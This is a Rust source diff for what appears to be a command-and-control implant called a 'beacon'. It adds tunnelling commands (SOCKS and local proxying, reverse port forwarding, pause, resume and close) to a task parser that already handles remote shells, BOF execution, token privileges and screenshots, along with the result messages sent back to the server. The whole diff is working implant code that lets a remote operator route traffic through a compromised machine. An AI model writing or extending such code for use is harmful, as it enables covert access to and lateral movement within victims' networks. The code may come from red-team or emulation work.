@@ -164,6 +164,17 @@ pub const COMMAND_TOKEN_PRIVS: u32 = 59;
 /// terminal drives Start/Write, close rides `jobs kill`).
 pub const COMMAND_SHELL_START: u32 = 71;
 pub const COMMAND_SHELL_WRITE: u32 = 72;
+/// Tunnels (native beacon_agent numbering; UDP — 63/65 — is not
+/// implemented, like the original specter's tunnel.c which is
+/// TCP-only). Tasks arrive through TunnelCallbacks (PROXY_DATA), the
+/// per-connection I/O rides TUNNEL_START/WRITE/CLOSE/ACCEPT records.
+pub const COMMAND_TUNNEL_START_TCP: u32 = 62;
+pub const COMMAND_TUNNEL_WRITE_TCP: u32 = 64;
+pub const COMMAND_TUNNEL_CLOSE: u32 = 66;
+pub const COMMAND_TUNNEL_REVERSE: u32 = 67;
+pub const COMMAND_TUNNEL_ACCEPT: u32 = 68;
+pub const COMMAND_TUNNEL_PAUSE: u32 = 69;
+pub const COMMAND_TUNNEL_RESUME: u32 = 70;
 /// Screenshot stream states (COMMAND_SCREENSHOT result byte).
 pub const SCREENSHOT_START: u8 = 1;
 pub const SCREENSHOT_CONTINUE: u8 = 2;
@@ -212,11 +223,17 @@ pub const TOKEN_FIELD_CAP: usize = 128;
 pub const SHELL_PROG_CAP: usize = 128;
 /// Longest shell input write (typed characters — terminal-sized).
 pub const SHELL_INPUT_CAP: usize = 512;
+/// Longest tunnel address (socks/lportfwd targets).
+pub const TUNNEL_ADDR_CAP: usize = 128;
 
 /// A parsed server task (the commands the beacon can delimit and execute;
 /// anything else in the pack stops the parse — the server keeps unprocessed
 /// tasks hosted and resends them).
+///
+/// The tunnel write carries its 16 KiB payload inline (no allocation in
+/// the beacon): the variant size difference is accepted deliberately.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
+#[allow(clippy::large_enum_variant)]
 pub enum Task {
     /// `COMMAND_PROFILE` subop 1: sleep seconds + jitter percent.
     Sleep { sec: u32, jitter_pct: u32 },
@@ -318,6 +335,24 @@ pub enum Task {
         data_len: u16,
         data: [u8; SHELL_INPUT_CAP],
     },
+    /// `COMMAND_TUNNEL_START_TCP` with the channel id, the tunnel type
+    /// (socks/lportfwd — informational), the target address and port.
+    TunnelStartTcp {
+        channel_id: u32,
+        addr_len: u16,
+        addr: [u8; TUNNEL_ADDR_CAP],
+        port: u32,
+    },
+    /// `COMMAND_TUNNEL_WRITE_TCP` with the channel id and the raw data.
+    /// `COMMAND_TUNNEL_CLOSE` with the channel id.
+    TunnelClose { channel_id: u32 },
+    /// `COMMAND_TUNNEL_PAUSE` with the channel id.
+    TunnelPause { channel_id: u32 },
+    /// `COMMAND_TUNNEL_RESUME` with the channel id.
+    TunnelResume { channel_id: u32 },
+    /// `COMMAND_TUNNEL_REVERSE` (rportfwd) with the tunnel id and the
+    /// listen port.
+    TunnelReverse { tunnel_id: u32, port: u32 },
 }
 
 impl Task {
@@ -569,6 +604,35 @@ pub fn parse_task(r: &mut Reader) -> Option<(Task, u32)> {
                 data,
             }
         }
+        COMMAND_TUNNEL_START_TCP => {
+            let channel_id = r.u32_le()?;
+            let _tunnel_type = r.u32_le()?;
+            let (addr_len, addr) = pack_string_cap::<TUNNEL_ADDR_CAP>(r)?;
+            let port = r.u32_le()?;
+            Task::TunnelStartTcp {
+                channel_id,
+                addr_len,
+                addr,
+                port,
+            }
+        }
+        COMMAND_TUNNEL_CLOSE => {
+            let channel_id = r.u32_le()?;
+            Task::TunnelClose { channel_id }
+        }
+        COMMAND_TUNNEL_PAUSE => {
+            let channel_id = r.u32_le()?;
+            Task::TunnelPause { channel_id }
+        }
+        COMMAND_TUNNEL_RESUME => {
+            let channel_id = r.u32_le()?;
+            Task::TunnelResume { channel_id }
+        }
+        COMMAND_TUNNEL_REVERSE => {
+            let tunnel_id = r.u32_le()?;
+            let port = r.u32_le()?;
+            Task::TunnelReverse { tunnel_id, port }
+        }
         _ => return None,
     };
     let id = r.u32_le()?;
@@ -646,6 +710,22 @@ impl BofTask<'_> {
 /// `[u32 LE 50 || u8 async || pack_string entry || u32 LE len || bof
 /// || u32 LE len || params || u32 LE taskId]`). The borrowed slices point
 /// into the reader's buffer — inline execution only.
+/// `COMMAND_TUNNEL_WRITE_TCP` parsed inline (the data borrows the
+/// response buffer — never inline in the Task enum: a big Copy variant
+/// chokes the clean-build codegen, the whole module is ICF'd away;
+/// SAVEMEMORY/EXEC_BOF use the same borrowing pattern).
+pub fn parse_tunnel_write<'a>(r: &mut Reader<'a>) -> Option<(u32, &'a [u8])> {
+    let command = r.u32_le()?;
+    if command != COMMAND_TUNNEL_WRITE_TCP {
+        return None;
+    }
+    let channel_id = r.u32_le()?;
+    let len = r.u32_le()? as usize;
+    let data = r.take(len)?;
+    let _task_id = r.u32_le()?;
+    Some((channel_id, data))
+}
+
 pub fn parse_exec_bof<'a>(r: &mut Reader<'a>) -> Option<BofTask<'a>> {
     let command = r.u32_le()?;
     if command != COMMAND_EXEC_BOF {
@@ -912,6 +992,39 @@ pub fn push_job_end(w: &mut Writer, job_id: u32, job_type: u8, state: u8) -> boo
 /// closes with the status): `byte type || byte state || int errorCode`.
 pub fn push_job_end_code(w: &mut Writer, job_id: u32, job_type: u8, state: u8, code: u32) -> bool {
     push_result_header(w, job_id, COMMAND_JOB) && w.u8(job_type) && w.u8(state) && w.u32(code)
+}
+
+/// TUNNEL_START_TCP result: `int sub || int result` — the server resumes
+/// the tunnel connection on 0, closes on 1, halts with the SOCKS5
+/// mapping on a WSA error code (10061 = connection refused).
+pub fn push_tunnel_start_result(w: &mut Writer, channel_id: u32, result: u32) -> bool {
+    push_result_header(w, channel_id, COMMAND_TUNNEL_START_TCP) && w.u32(0) && w.u32(result)
+}
+
+/// TUNNEL_WRITE_TCP result: `array data` (data read from the socket).
+pub fn push_tunnel_write_result(w: &mut Writer, channel_id: u32, data: &[u8]) -> bool {
+    push_result_header(w, channel_id, COMMAND_TUNNEL_WRITE_TCP) && w.array(data)
+}
+
+/// TUNNEL_CLOSE result: `int 0 || int 0` (the peer closed).
+pub fn push_tunnel_close_result(w: &mut Writer, channel_id: u32) -> bool {
+    push_result_header(w, channel_id, COMMAND_TUNNEL_CLOSE) && w.u32(0) && w.u32(0)
+}
+
+/// TUNNEL_ACCEPT result (rportfwd): `int newChannelId` — the accepted
+/// connection rides its own channel from now on.
+pub fn push_tunnel_accept_result(w: &mut Writer, tunnel_id: u32, new_channel_id: u32) -> bool {
+    push_result_header(w, tunnel_id, COMMAND_TUNNEL_ACCEPT) && w.u32(new_channel_id)
+}
+
+/// TUNNEL_REVERSE result: `int sub || int result` (1 = bound OK).
+pub fn push_tunnel_reverse_result(w: &mut Writer, tunnel_id: u32, result: u32) -> bool {
+    push_result_header(w, tunnel_id, COMMAND_TUNNEL_REVERSE) && w.u32(0) && w.u32(result)
+}
+
+/// TUNNEL_PAUSE/RESUME ack: the header alone.
+pub fn push_tunnel_flag_result(w: &mut Writer, channel_id: u32, command_id: u32) -> bool {
+    push_result_header(w, channel_id, command_id)
 }
 
 /// JOB_LIST result: `int count`, then `int jobId || word type || word pid`
